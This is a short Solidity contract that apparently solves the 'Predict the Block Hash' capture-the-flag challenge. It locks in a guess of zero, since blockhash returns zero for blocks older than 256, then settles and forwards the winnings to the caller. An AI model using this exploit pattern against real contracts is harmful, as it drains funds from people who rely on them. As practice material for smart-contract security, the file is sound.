pragma solidity 0.4.24;

interface IPredictTheBlockHashChallenge {
    function lockInGuess(bytes32 hash) public payable;

    function settle() public;
}

contract PredictTheBlockHashChallengeSolver {
    function enterGuess(address challenge) public payable {
        require(msg.value == 1 ether, 'msg.value');

        bytes32 guess = block.blockhash(1);
        IPredictTheBlockHashChallenge instance = IPredictTheBlockHashChallenge(challenge);
        instance.lockInGuess.value(msg.value)(guess);
    }

    function solveChallenge(address challenge) public {
        IPredictTheBlockHashChallenge instance = IPredictTheBlockHashChallenge(challenge);
        instance.settle();

        // revert if reward not received
        require(address(this).balance >= 2 ether, 'eth not received');
        msg.sender.transfer(address(this).balance);
    }

    function() public payable {}
}
